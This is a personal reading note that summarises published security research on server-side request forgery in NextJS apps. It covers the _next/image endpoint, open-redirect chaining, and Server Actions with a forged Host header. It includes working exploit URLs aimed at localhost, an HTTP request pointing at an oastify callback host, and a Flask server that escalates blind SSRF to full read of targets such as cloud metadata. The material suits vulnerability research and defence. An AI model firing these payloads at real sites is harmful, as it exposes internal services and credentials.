---
author: assetnote.io
aliases:
  - Digging for SSRF in NextJS Apps
tags:
  - readwise/articles
url: https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps?__readwiseLocation=
date: 2025-04-24
summary: NextJS websites can have misconfigurations, like a vulnerability in the _next/image endpoint, allowing for SSRF attacks. By manipulating the remotePatterns in the next.config.js file, attackers can exploit blind SSRF vulnerabilities. Server Actions in NextJS also pose risks, as a forged Host header can lead to SSRF attacks when fetching responses.
---
# Digging for SSRF in NextJS Apps

## SSRF in \_next/image

```sh
https://example.com/_next/image?url=https://localhost:2345/api/v1/x&w=256&q=75
```

If the upstream response is a valid image, it will be passed to the user. There are a couple of rare conditions that this can be escalated further:

- If the version of NextJS is old, or dangerouslyAllowSVG is set to true, you can link to an SVG url hosted on your domain, leading to XSS.

- If the version of NextJS is old, or dangerouslyAllowSVG is set to true, you can leak the full content of XML responses via SSRF. This is because NextJS uses sniffing to determine the content type of the response even if a Content-Type header is provided, and to check for SVG NextJS simply checks the response starts with `<?xml`.

- If any internal host does not respond with a Content-Type, the full response will also be leaked. This is unlikely but sometimes happens with misconfigured proxies or the like.

A more common scenario is that some specific domains are whitelisted. However, the image renderer follows redirects. Thus if you were to find any open redirect on a whitelisted domain, you can turn this into a blind SSRF. For example, suppose third-party.com was whitelisted and you found an open redirect at third-party.com/logout?url=foo. You could then hit an internal server with SSRF with a request like:

```sh
https://example.com/_next/image?url=https://third-party.com/logout%3furl%3Dhttps%3A%2F%2Flocalhost%3A2345%2Fapi%2Fv1%2Fx&w=256&q=75
```

## SSRF in Server Actions

NextJS provides a fully featured server side framework with Server Actions. This allows writing JS code that will be executed asynchronously on the server when called.

TL;DR: To be vulnerable to this SSRF, we require that:
- A server action is defined;
- The server action redirects to a URL starting with `/`;
- We are able to specify a custom Host header while accessing the application.

```http
POST /x HTTP/1.1
Host: kwk4ufof0q3hdki5e46mpchscjia69uy.oastify.com
Content-Length: 4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
Next-Action: 15531bfa07ff11369239544516d26edbc537ff9c
Connection: close

{}
```

### From Blind SSRF to Full Read

We have a working blind [Server Side Request Forgery (SSRF)](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Server%20Side%20Request%20Forgery%20(SSRF).md)! However, we can do better. Let's revisit the logic of exactly what requests #NextJS makes: [](https://read.readwise.io/read/01jkdyhesasj501zt0k7ahmmvb)

The logic is as follows: 
- The server first does a preflight HEAD request to the URL.
- If the preflight returns a `Content-Type` header of `RSC_CONTENT_TYPE_HEADER`, which is `text/x-component`, then NextJS makes a GET request to the same URL.
- The content of that GET request is then returned in the response.

Of course, it's unlikely that any of our SSRF targets (like cloud metadata endpoints) would return that content type, so what can be done? We can satisfy these checks and turn our SSRF into a full read as follows: 
- Set up a server that takes requests on **any path**.
- On any HEAD request, return a 200 with `Content-Type: text/x-component`.
- On a GET request, return a 302 to our intended SSRF target (such as `metadata.internal` or the like)
- When NextJS fetches from our server, it will satisfy the preflight check on our HEAD request, but will follow the redirect on GET, giving us a full read SSRF! [](https://read.readwise.io/read/01jkdyhzr17cef32mdgjhezjw9)

```python
from flask import Flask, Response, request, redirect
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    return redirect('https://example.com')
```

